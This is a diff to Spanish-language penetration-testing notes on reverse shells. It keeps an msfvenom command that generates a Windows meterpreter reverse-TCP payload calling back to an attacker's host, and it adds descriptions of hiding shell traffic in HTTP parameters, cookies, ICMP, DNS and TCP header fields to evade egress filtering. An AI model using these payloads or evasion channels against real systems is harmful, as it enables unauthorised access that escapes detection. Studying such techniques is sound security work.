@@ -85,6 +85,24 @@ Por ejemplo, una reverse shell de meterpreter para windows (spoiler: osfuscar un
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
 
+### Reverse Shells con evasión:
+Tipicamente nos toparemos con que no existe salida de TCP o UDP, por lo que tendremos que buscar salir por conexiones como DNS, ICMP, etc. o camuflajearnos dentro de conexiones HTPPS, este tipo de reverseshell son un poco más sofisticadas, pero muy utiles.
+
+#### HTTP:
+Ya sea por ssl o por texto plano, podemos crear una reverse shell que envie el resultado del comando por parametros de GET, o incluso ocultos en la cookie.
+
+#### ICMP:
+Oculto en las cabeceras del paquete puede venir la información de ejecución de comandos.
+
+#### DNS Tunneling:
+
+#### TCP Parameters:
+Dentro de las cabeceras de los paquetes de TCP puede venir información oculta.
+
+- IP Identification Field: Aqui cabe un caracter por conexión.
+- TCP Acknowladgement Number: Aqui cabe un caracter por conexión pero es más dificil manejarlo.
+- TCP Initial Number: No es necesario empezar la conexión, permite encapsular un caracter en flags SYN y RST. 
+
 ### Payloads en codigo interpretado:
 Tambien podemos crear en base a codigo no compliado por ejemplo powershell, php, bash, etc. Esto claro dependera del servicio a explotar, una buena guia con tipicos payloads es:
 
